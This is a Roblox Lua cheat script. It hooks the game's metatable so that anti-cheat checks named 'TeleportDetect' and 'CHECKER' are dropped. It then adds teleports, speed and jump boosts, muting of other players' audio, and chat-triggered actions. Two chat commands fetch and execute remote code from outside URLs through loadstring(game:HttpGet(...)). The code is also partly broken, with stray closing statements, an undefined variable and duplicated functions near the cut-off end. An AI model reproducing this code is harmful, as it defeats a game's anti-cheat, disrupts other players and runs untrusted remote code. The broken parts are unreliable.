local  MyStand = "Felkusama"
local SuperJumpEnabled = false

local NextA,WatchA = 6961399550,6961400034

getgenv().Toggled = false
local UIS = game:GetService("UserInputService")
UIS.InputBegan:connect(function(input,gameProcessed)

	if input.UserInputType == Enum.UserInputType.Keyboard then

        if input.KeyCode == Enum.KeyCode.C and UIS:GetFocusedTextBox() == nil and getgenv().Toggled == true then
        local A_1 = "Are you watching me!?"; local A_2 = "All";local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest;Event:FireServer(A_1, A_2)
        play(WatchA,true,true)
        
        elseif input.KeyCode == Enum.KeyCode.V and UIS:GetFocusedTextBox() == nil and getgenv().Toggled == true then

        local A_1 = "You are next."; local A_2 = "All";local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest;Event:FireServer(A_1, A_2)
        play(NextA,true,true)

        elseif input.KeyCode == Enum.KeyCode.H then
			if UIS:GetFocusedTextBox() == nil then
				if getgenv().Toggled == false then
					getgenv().Toggled = true
				else
					getgenv().Toggled = true
				end;end;end;end;end)

local LocalPlayer = game:GetService("Players").LocalPlayer
local Cookies = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
local OriginalKeyUpValue = 0
local Anim = Instance.new("Animation" )
Anim.AnimationId = "rbxassetid://2788290270"
local CoreUI = Instance.new("ScreenGui")
CoreUI.Parent = game.CoreGui
local SaveLocation = nil
local RigWalk = nil
local RigIdle = nil
local InTimeErase = false

local Pointing = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
Pointing.AnimationId = "rbxassetid://507770453"

local Poter = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
Poter.Looped = true
Poter.Priority = Enum.AnimationPriority.Action

local WalkAnimation = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
WalkAnimation.AnimationId = "rbxassetid://2510198475"

local Idle = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
Idle.AnimationId = "rbxassetid://507766388"

local OldChar = LocalPlayer.Character

function FoV()
	local fov = coroutine.wrap(function()
		local Camera = workspace.Camera
		for i = 1, 20 do
			Camera.FieldOfView = 8*i
			wait(0.01)
		end
		for i = 1, 20 do
			Camera.FieldOfView = 160-i*4.5
			wait(0.01)
		end
	end)
	fov()
end

local WalkSpeed = false

function Lighting()
	if game.Lighting:FindFirstChild("ERASE") == nil then
		local sound5 = Instance.new("Sound", CoreUI)
		sound5.Volume = 0.1
		sound5.Name = "ERASE"
		sound5.Looped = true
		sound5.SoundId = "rbxassetid://3167092959"
		sound5:Play()

		game.Lighting.Sky.Parent = workspace
		game:GetObjects("rbxassetid://6546113226")[1].Parent=game.Lighting

	else
		workspace.Sky.Parent = game.Lighting
		CoreUI:FindFirstChild("ERASE"):Destroy()
		game.Lighting:FindFirstChild("ERASE"):Destroy()
	end
end

function TimeEraseUI()
	local sound5 = Instance.new("Sound", CoreUI)
	sound5.Volume = 0.1
	sound5.SoundId = "rbxassetid://6546128175"
	sound5:Play()

	local Image = Instance.new("ImageLabel", CoreUI)
	Image.Image = "http://www.roblox.com/asset/?id=6546043746"
	Image.BackgroundTransparency = 1
	Image.AnchorPoint = Vector2.new(0.5, 0.5)
	Image.Size = UDim2.fromScale(1, 1)
	Image.Position = UDim2.fromScale(-0.5, 0.5)
	delay(0, function()
		for i = 0, 1, 0.1 do
			Image.Position = UDim2.fromScale(-Image.Position.X.Scale+i, 0.5)
			Image.ImageTransparency = Image.ImageTransparency+i
			wait(.01)
		end
		Image:Destroy()
		sound5:Destroy()
	end)
end


function ModelCharacter()
	if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
		local MODEL = Instance.new("Model", workspace)
		MODEL.Name = LocalPlayer.Name.."StringKOD"

		OldChar.Humanoid:UnequipTools()

		for i, v in pairs(OldChar:GetChildren()) do 
			if (v:IsA("BasePart")  or v:IsA("MeshPart")) and v.Parent:FindFirstChildOfClass("Humanoid") and v.Name ~= "HumanoidRootPart" then
				local Part = v:Clone()
				Part.Parent = MODEL
				Part.Name = v.Name
				Part.Material = Enum.Material.ForceField
				Part.CFrame = v.CFrame
				Part.Transparency = 0.5 
				Part.BrickColor = BrickColor.Red()
				Part.CanCollide = false
				Part.Anchored = true
				for i, v  in pairs(Part:GetChildren()) do 
					if v.ClassName ~= "SpecialMesh" then
						v:Destroy()
					end
				end
			end
		end
		local NewCharacter = game:GetObjects("rbxassetid://6547055500")[1]
		NewCharacter.Parent = MODEL
		NewCharacter.Name = "Idaro"

		workspace.Camera.CameraSubject = NewCharacter.Humanoid
		SaveLocation = OldChar.HumanoidRootPart.CFrame
		InTimeErase = true
		NewCharacter.HumanoidRootPart.CFrame = SaveLocation

		RigIdle = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(Idle)
		RigIdle.Looped = true
		RigIdle.Priority = Enum.AnimationPriority.Action
		RigWalk = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(WalkAnimation)
		RigWalk.Looped = true
		RigWalk.Priority = Enum.AnimationPriority.Action
		WalkSpeed = true
		RigIdle:Play()
	else
		InTimeErase = false
		WalkSpeed = false
		workspace.Camera.CameraSubject =  OldChar.Humanoid
		OldChar.HumanoidRootPart.CFrame =  workspace:FindFirstChild(LocalPlayer.Name.."StringKOD").Idaro.HumanoidRootPart.CFrame
		workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):Destroy()
	end
end

function Slide()
	local XD = OldChar.Humanoid:LoadAnimation(Anim)
	XD:Play()
	XD.TimePosition = 0.15
	XD.Looped = false
	XD:AdjustSpeed(1.1)
end

function AddVelocity(Vel, Char)
	Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity+Vel
end

local IsJump = false

function Jumping()
	if IsJump == false then
		return false
	else
		return true
	end
end

local Mouse = LocalPlayer:GetMouse()

assert(getrawmetatable)
gmt = getrawmetatable(game)
setreadonly(gmt, false)
old = gmt.__namecall
gmt.__namecall =
	newcclosure(
		function(self, ...)
		local args = {...}
		if tostring(args[1]) == "TeleportDetect" then
			return
		elseif tostring(args[1]) == "CHECKER_1" then
			return
		elseif tostring(args[1]) == "CHECKER" then
			return
		end

		return old(self, ...)
	end
	)


local MoveDirection = Vector3.new(0,0,0)
local WSpped = 0 
local LeftSpeed = 0
local UpSpeed = 0

function IdleRigXD()
	if RigIdle and RigWalk.IsPlaying and WSpped == 0 and LeftSpeed == 0 and UpSpeed == 0 then
		RigIdle:Play()
		RigWalk:Stop()
	end
end

function WalkRigXD()
	if RigWalk and RigIdle.IsPlaying then
		RigIdle:Stop()
		RigWalk:Play()
	end
end

Mouse.KeyDown:Connect(function(KeyDownXD)
	if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") then
		if KeyDownXD == "w" then
			WSpped = -1
			WalkRigXD()
		elseif KeyDownXD == "a" then
			LeftSpeed = -1
			WalkRigXD()
		elseif KeyDownXD == "d" then
			LeftSpeed = 1
			WalkRigXD()
		elseif KeyDownXD == "s" then
			WSpped = 1
			WalkRigXD()
		end
	end
end)

Mouse.KeyUp:Connect(function(KeyDownXD)
	if KeyDownXD == "w" then
		WSpped = 0
		IdleRigXD()
	elseif KeyDownXD == "a" then
		LeftSpeed = 0
		IdleRigXD()
	elseif KeyDownXD == "d" then
		LeftSpeed = -0
		IdleRigXD()
	elseif KeyDownXD == "s" then
		WSpped = 0
		IdleRigXD()
	end
end)

local CD = false
local uis = game:GetService("UserInputService")

uis.InputBegan:Connect(function(i, XD)
	if i.KeyCode == Enum.KeyCode.H and XD == false then
		if SuperJumpEnabled == false then
			SuperJumpEnabled = true
		elseif SuperJumpEnabled == true then
			SuperJumpEnabled = false
		end
	end
end)

uis.InputBegan:Connect(function(i, XD)
	if i.KeyCode == Enum.KeyCode.Space and XD == false then
		if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
			if Jumping() == true and not Poter.IsPlaying then
				AddVelocity(OldChar.HumanoidRootPart.CFrame.LookVector*150, OldChar)
				IsJump = false
				Cookies:Stop()
				CD = true
				play(6543434995, true, true)
				Slide()
				repeat wait() until workspace:FindPartOnRayWithWhitelist(Ray.new(OldChar.HumanoidRootPart.Position, Vector3.new(0, -4 * OldChar.HumanoidRootPart.Size.y, 0)), { workspace.MAP })
				CD = false
			end
		else
			workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:ChangeState(3)
		end
	end
end)

local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character
local Root = Character.HumanoidRootPart 
local ply = game.Players.LocalPlayer
local chr = ply.Character

plr = game.Players.LocalPlayer
 
hum = plr.Character.HumanoidRootPart
 
mouse = plr:GetMouse()
 
 
 
mouse.KeyDown:connect(function(key)
 
if key == "x" then

    
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -50)
        play(6603980575, true, true)
    
    
end 
end)

local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character
local Root = Character.HumanoidRootPart 
local ply = game.Players.LocalPlayer
local chr = ply.Character

plr = game.Players.LocalPlayer
 
hum = plr.Character.HumanoidRootPart
 
mouse = plr:GetMouse()
 
 
 
mouse.KeyDown:connect(function(key)
 
if key == "p" then

local chr = game.Players.LocalPlayer.Character
--Torso
chr.LowerTorso:Destroy()
chr.UpperTorso:Destroy()
--



--Humanoid
chr.Humanoid:Destroy()
---



--Head
chr.Head:Destroy()
---







--arms and some shit

chr.LeftHand:Destroy()
chr.RightHand:Destroy()
chr.LeftLowerArm:Destroy()
chr.RightLowerArm:Destroy()
chr.LeftUpperArm:Destroy()
chr.RightUpperArm:Destroy()
--yes
chr.LeftFoot:Destroy()
chr.RightFoot:Destroy()
chr.LeftLowerLeg:Destroy()
chr.RightLowerLeg:Destroy()
chr.LeftUpperLeg:Destroy()
chr.RightUpperLeg:Destroy()
--
for i,v in pairs(game.Players.Benoxav.Character:GetChildren()) do
				if v.ClassName == 'Accessory' then
					v.Handle:Destroy()
				end
			end 
end
end)

function StopAudio()
	OldChar.LowerTorso.BOOMBOXSOUND:Stop()
end

function stop(ID, Key)
	local cor = coroutine.wrap(function()
		wait(OldChar.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
		if OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
			StopAudio()
		end
	end)
	cor()
end


function play(ID, STOP, LMAO)
	if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
		local Tool = nil
		if OldChar:FindFirstChildOfClass("Tool") and LMAO == true then
			Tool = OldChar:FindFirstChildOfClass("Tool")
			OldChar:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
		end
		LocalPlayer.Backpack["[Boombox]"].Parent =
			OldChar
		game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
		OldChar["[Boombox]"].RequiresHandle = false
		if OldChar["[Boombox]"]:FindFirstChild("Handle") then
			OldChar["[Boombox]"].Handle:Destroy()
		end
		OldChar["[Boombox]"].Parent =
			LocalPlayer.Backpack
		LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
		if Tool ~= true then
			if Tool then
				Tool.Parent = OldChar
			end
		end
		if STOP == true then
			OldChar.LowerTorso:WaitForChild("BOOMBOXSOUND")
			local cor = coroutine.wrap(function()
				repeat wait() until OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OldChar.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
				OriginalKeyUpValue = OriginalKeyUpValue+1
				stop(ID, OriginalKeyUpValue)
			end)
			cor()
		end
	end
end

local TimeErase, CanCel = "Time erase!", "Time erase!"
local XD = false
LocalPlayer.Chatted:Connect(function(MSG)
	if MSG:sub(1, 11) == TimeErase and XD == false and not Poter.IsPlaying then
		XDDDD(XD)
	elseif MSG == CanCel and XD == true and not Poter.IsPlaying then
		XDDDD(XD)
	end
end)

function XDDDD(XDR)
	if XDR == false then
		XD = true
		play(6546133414, true, true)
		wait(1.5)
		TimeEraseUI()
		FoV()
		Lighting()
		ModelCharacter()
		for i, v in pairs(game.Workspace.MAP:GetDescendants()) do
			if v:IsA("BasePart") or v:IsA("WedgePart") or v:IsA("Part") or v:IsA("BallPart") or v:IsA("MeshPart") or v:IsA("Decal") or v:IsA("Texture") then
				v.Transparency = v.Transparency+1
			end
		end
	else
		XD = false
		InTimeErase = false
		play(6543435253, true, true)
		TimeEraseUI()
		ModelCharacter()
		Lighting()
		FoV()
		for i, v in pairs(game.Workspace.MAP:GetDescendants()) do
			if v:IsA("BasePart") or v:IsA("WedgePart") or v:IsA("Part") or v:IsA("BallPart") or v:IsA("MeshPart") or v:IsA("Decal") or v:IsA("Texture") then
				v.Transparency = v.Transparency-1
			end
		end
	end
end


function Jump(...)
	(...).Jumping:Connect(function()
		if SuperJumpEnabled == true then
		if CD == false and not Poter.IsPlaying then
			CD = true
			delay(1, function()
				CD = false
			end)
			Cookies:Play(0, 1, 1.4)
			AddVelocity(OldChar.HumanoidRootPart.CFrame.UpVector*120, OldChar)
			play(6543436906, true, true)
			delay(0, function()
				IsJump = true
				wait(1) 
				if IsJump == true then
					IsJump = false
				end
			end)
			end
		end
	end)
end


Jump(OldChar.Humanoid)

LocalPlayer.CharacterAdded:Connect(function(Character)
	wait(1)
	if Character.Name == LocalPlayer.Name then
		Jump(Character.Humanoid)
		Poter = Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
		Poter.Looped = true
		Poter.Priority = Enum.AnimationPriority.Action

		Cookies = Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
		OldChar = Character
	end
end)

game["Run Service"].Heartbeat:Connect(function()
	if InTimeErase then
		for i, v in pairs(OldChar:GetChildren()) do
			if v:IsA("BasePart") then
				v.CFrame = CFrame.new(math.random(200, 500), math.random(200, 500), math.random(200, 500))
				v.Velocity = Vector3.new(0,0,0)
			end
		end

		if OldChar:FindFirstChild("Combat") and XD == true then
			XD = false
			XDDDD(true)
		end

		if WalkSpeed == true then
			MoveDirection = Vector3.new(LeftSpeed, UpSpeed, WSpped)
			workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:Move(MoveDirection, true)
		end
	else
		if OldChar:FindFirstChild("[Flashlight]") then
			if workspace.Players:FindFirstChild(MyStand) then
				if not Poter.IsPlaying then
					Poter:Play()
					Poter:AdjustSpeed(0)
					Poter.TimePosition = 1.2
				end
				local lol = workspace.Players:FindFirstChild(MyStand).HumanoidRootPart.CFrame * CFrame.new(0, 0.5, 1.25)
				OldChar.HumanoidRootPart.CFrame = lol
			end
		else
			if Poter.IsPlaying then
				Poter:Stop()
			end
		end
	end
end)
getgenv().Transform = "Transform!"
getgenv().Titan = "Rage!"
getgenv().DashLoad = "LOADDASH"
getgenv().Stand = "/e stand"
getgenv().DragonMode = "/e dragonmode"
getgenv().HideMask = "/e hidemask"
getgenv().SafeTp = "/safetp"
getgenv().Revive = "/revive"

--toggle
local standmode = false
local dragonmode = false
local bulletdef = false
local dashtoggle = false
local isrevive = false
local isstped = false

--end

    local backpack = game.Players.LocalPlayer:FindFirstChild("Backpack")
    local Tool = backpack:FindFirstChild("OverDrive") or game.Players.LocalPlayer.Character:FindFirstChild("OverDrive")
    if not Tool then
        local OverDrive = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
        OverDrive.Name = "OverDrive"
        OverDrive.RequiresHandle = false
        local overdrive = false
        local ps = game:GetService("Players")
        local lp = ps.LocalPlayer
        local char = lp.Character
        OverDrive.Activated:Connect(function()
            if overdrive == true then
                overdrive = false
                char.BodyEffects.Movement.HulkJump:Destroy()
                char.BodyEffects.Movement.SuperSpeed:Destroy()
            elseif overdrive == false then
                overdrive = true
                local HulkJump = Instance.new("IntValue")
                HulkJump.Name = "HulkJump"
                HulkJump.Parent = char.BodyEffects.Movement
                local SuperSpeed = Instance.new("IntValue")
                SuperSpeed.Name = "SuperSpeed"
                SuperSpeed.Parent = char.BodyEffects.Movement
        end
    end)
end

local OriginalKeyUpValue = 0
function StopAudio()
	if game:GetService("Players").LocalPlayer.Character.LowerTorso:FindFirstChild("BOOMBOXSOUND") then
		game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
	end
end
function stop(ID, Key)
	local cor = coroutine.wrap(function()
		wait(game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
		if game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
			StopAudio()
		end
	end)
	cor()
end
function play(ID, STOP, LMAO)
	if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
		local Tool = nil
		if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") and LMAO == true then
			Tool = game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Parent = game:GetService("Players").LocalPlayer.Backpack
		end
		game:GetService("Players").LocalPlayer.Backpack["[Boombox]"].Parent =
			game:GetService("Players").LocalPlayer.Character
		game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
		game:GetService("Players").LocalPlayer.Character["[Boombox]"].RequiresHandle = false
		if game:GetService("Players").LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
			game:GetService("Players").LocalPlayer.Character["[Boombox]"].Handle:Destroy()
		end
		game:GetService("Players").LocalPlayer.Character["[Boombox]"].Parent =
			game:GetService("Players").LocalPlayer.Backpack
		game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
		if Tool ~= true then
			if Tool then
				Tool.Parent = game:GetService("Players").LocalPlayer.Character
			end
		end
		if STOP == true then
			game:GetService("Players").LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
			local cor = coroutine.wrap(function()
				repeat wait() until game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
				OriginalKeyUpValue = OriginalKeyUpValue+1
				stop(ID, OriginalKeyUpValue)
			end)
			cor()
		end
	end
end

local oldc = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game:GetService('Players').LocalPlayer.Chatted:Connect(function(msg)
	if msg == getgenv().Stand then
		standmode = true
		if standmode then
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "rbxassetid://7318630720"
			Animate.idle.Animation2.AnimationId = "rbxassetid://7318630720"
			Animate.run.RunAnim.AnimationId = "rbxassetid://657564596"
			Animate.walk.WalkAnim.AnimationId = "rbxassetid://657552124"
			Animate.climb.ClimbAnim.AnimationId = "rbxassetid://658360781"
			Animate.fall.FallAnim.AnimationId = "rbxassetid://657600338"
			Animate.swim.Swim.AnimationId = "rbxassetid://657560551"
			Animate.swimidle.SwimIdle.AnimationId = "rbxassetid://657557095"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		else 
			standmode = false
		end
	elseif msg == getgenv().DragonMode then
		if dragonmode then
			dragonmode = false
		end
		dragonmode = true
	elseif msg == getgenv().Transform then   
		if bulletdef == false then
			bulletdef = true
			local bulletids = {
				"5185157119";
				"5185157257";
			}
			local Humanoid = game.Players.LocalPlayer.Character.Humanoid
			local OldHealth = Humanoid.Health
			Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
				if bulletdef == true then
					if Humanoid.Health < OldHealth then
						play(bulletids[math.random(1,#bulletids)], true, true)
					end
					OldHealth = Humanoid.Health
				end
			end)
		elseif bulletdef == true then
			bulletdef = false
		end
	elseif msg == getgenv().DashLoad then
		if dashtoggle == false then
			dashtoggle = true
			local Char = game.Players.LocalPlayer.Character local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
			while dashtoggle do wait()
				for i,v in next, Hum:GetPlayingAnimationTracks() do
					if v.Animation.AnimationId == "rbxassetid://2788289281" then
						v:Stop()
						for i,v in next, Hum:GetPlayingAnimationTracks() do
							if v.Animation.AnimationId == "rbxassetid://2788292075" then
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -30)
								wait(0.1)
								game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = true;
								wait(1.5)
								game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = false
							end
						end
					end
				end
			end
		else
			dashtoggle = false
		end
	elseif msg == getgenv().HideMask then  
		if game.Players.LocalPlayer.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle') then
			game.Players.LocalPlayer.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle'):Destroy()
		end
	elseif msg == getgenv().SafeTp then
		if isstped == false then
			isstped = true
			oldc = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			wait(0.75)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207, 38, 200016)
		elseif isstped then
			isstped = false
			wait(0.75)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldc
		end
	elseif msg == getgenv().Revive then
		if isrevive == false then
			isrevive = true
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm back!", "All")
			while isrevive do
				wait()
				for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
					if v.Name == "GRABBING_CONSTRAINT" then
						v:Destroy()
						game.Players.LocalPlayer.Character.Humanoid.Sit = true
						wait(0.2)
						game.Players.LocalPlayer.Character.Humanoid.Jump = true
					end
				end
			end
		else 
			isrevive = false
		end
	end
end)
game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.Visible = true
end
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".mute" then
        getgenv().loopmute = "/mute"
local isloopmute = false
        isloopmute = not isloopmute
        coroutine.wrap(function()
            while isloopmute do
                wait()
                for _, v in pairs(game:GetService('Players'):GetPlayers()) do
                    if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                        pcall(function()
                            if v.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').Playing then
                                v.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND'):Stop();
                            end;
                        end);
                    end;
                end;
            end;
        end)();
    end -- final end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".hoopz" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Zackyport/whitelist/main/white"))()
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".worldz" then
    loadstring(game:HttpGet"https://thedragonslayer2.github.io")()
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".shazam" then
function Fly()
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	function stop(ID, Key)
		local cor = coroutine.wrap(function()
			wait(LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
			if LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
				StopAudio()
			end
		end)
		cor()
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	Tool0 = Instance.new("Tool")
	LocalScript1 = Instance.new("LocalScript")
	Sound2 = Instance.new("Sound")
	Sound3 = Instance.new("Sound")
	Animation4 = Instance.new("Animation")
	RemoteEvent5 = Instance.new("RemoteEvent")
	Animation6 = Instance.new("Animation")
	Tool0.Name = "Fly"
	Tool0.Parent = mas
	Tool0.CanBeDropped = false
	Tool0.RequiresHandle = false
	LocalScript1.Name = "local"
	LocalScript1.Parent = Tool0
	table.insert(cors,sandbox(LocalScript1,function()
		wait();
		local l__LocalPlayer__1 = game.Players.LocalPlayer;
		while true do
			wait();
			if l__LocalPlayer__1.Character then
				break;
			end;
		end;
		local l__Character__2 = l__LocalPlayer__1.Character;
		local l__Humanoid__3 = l__Character__2:WaitForChild("Humanoid");
		local l__Parent__4 = script.Parent;
		local u1 = false;
		local u2 = l__Humanoid__3:LoadAnimation(script.Hover);
		local u3 = nil;
		local u4 = nil;
		local u5 = false;
		local u6 = false;
		local u7 = l__Humanoid__3:LoadAnimation(script.Fly);
		l__Parent__4.Equipped:connect(function(p1)
			Sound3:Play()
			p1.TargetFilter = workspace;
			u1 = true;
			u2:Play();
			u3 = Instance.new("BodyGyro");
			u3.Name = "NA";
			u3.Parent = l__Character__2.HumanoidRootPart;
			u3.MaxTorque = Vector3.new(30000, 0, 30000);
			u3.P = u3.P * 5;
			u3.CFrame = CFrame.new(0, 0, 0);
			u4 = Instance.new("BodyPosition");
			u4.Name = "NA";
			u4.Parent = l__Character__2.HumanoidRootPart;
			u4.MaxForce = Vector3.new(60000, 60000, 60000);
			u4.Position = l__Character__2.HumanoidRootPart.Position;
			p1.Button1Down:connect(function()
				Sound2:Play()
				if u5 then
					return;
				end;
				u5 = true;
				u6 = true;
				u7:Play();
				local v5 = Instance.new("BodyVelocity", l__Character__2.HumanoidRootPart);
				v5.MaxForce = Vector3.new(50000, 50000, 50000);
				v5.Velocity = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p).lookVector * 85;
				u3.MaxTorque = Vector3.new(30000, 30000, 30000);
				u3.CFrame = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p);
				u4.Parent = nil;
				l__Humanoid__3.AutoRotate = false;
				if u2.IsPlaying then
					u2:Stop();
				end;
				while u6 do
					v5.Velocity = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p).lookVector * 85;
					u3.CFrame = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p);
					game:GetService("RunService").Heartbeat:wait();		
				end;
				l__Humanoid__3.AutoRotate = true;
				v5:Destroy();
				if u4 ~= nil then
					u4.Position = l__Character__2.HumanoidRootPart.Position;
					u4.Parent = l__Character__2.HumanoidRootPart;
				end;
				if u3 ~= nil then
					u3.MaxTorque = Vector3.new(30000, 0, 30000);
					u3.CFrame = CFrame.new(0, 0, 0);
				end;
				u6 = false;
				if u1 then
					u2:Play();
				end;
				u7:Stop();
				wait(0.3);
				u5 = false;
			end);
			p1.Button1Up:connect(function()
			    Sound2:Stop()
				Sound3:Play()
				u6 = false;
			end);
		end);
		l__Parent__4.Unequipped:connect(function()
		    Sound2:Stop()
			Sound3:Play()
			u1 = false;
			u6 = false;
			u3:Destroy();
			u3 = nil;
			u4:Destroy();
			u4 = nil;
			if u2.IsPlaying then
				u2:Stop();
			end;
		end);
	end))
	function StopAudio()
		OldChar.LowerTorso.BOOMBOXSOUND:Stop()
	end
	
	function stop(ID, Key)
		local cor = coroutine.wrap(function()
			wait(OldChar.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
			if OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
				StopAudio()
			end
		end)
		cor()
	end
	
	
	function play(ID, STOP, LMAO)
		if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
			local Tool = nil
			if OldChar:FindFirstChildOfClass("Tool") and LMAO == true then
				Tool = OldChar:FindFirstChildOfClass("Tool")
				OldChar:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
			end
			LocalPlayer.Backpack["[Boombox]"].Parent =
				OldChar
			game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
			OldChar["[Boombox]"].RequiresHandle = false
			if OldChar["[Boombox]"]:FindFirstChild("Handle") then
				OldChar["[Boombox]"].Handle:Destroy()
			end
			OldChar["[Boombox]"].Parent =
				LocalPlayer.Backpack
			LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
			if Tool ~= true then
				if Tool then
					Tool.Parent = OldChar
				end
			end
			if STOP == true then
				OldChar.LowerTorso:WaitForChild("BOOMBOXSOUND")
				local cor = coroutine.wrap(function()
					repeat wait() until OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OldChar.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
					OriginalKeyUpValue = OriginalKeyUpValue+1
					stop(ID, OriginalKeyUpValue)
				end)
				cor()
			end
		end
	end
	Sound2.Name = "Flapping"
	Sound2.Parent = LocalScript1
	Sound2.Looped = true
	Sound2.MaxDistance = 100
	Sound2.Pitch = 1.5
	Sound2.PlaybackSpeed = 1.5
	Sound2.SoundId = "rbxassetid://1462718291"
	local Sound2 = Instance.new("Sound", CoreUI)
		sound5.Volume = 0.1
		sound5.Name = "Flapping"
		sound5.Looped = true
		sound5.SoundId = "rbxassetid://1462718291"
		sound5:Play()
	Sound3.Name = "Activation"
	Sound3.Parent = LocalScript1
	Sound3.MaxDistance = 100
	Sound3.SoundId = "rbxassetid://2952274135"
	local Sound3 = Instance.new("Sound", CoreUI)
	sound5.Volume = 0.1
	sound5.Name = "Flapping"
	sound5.Looped = true
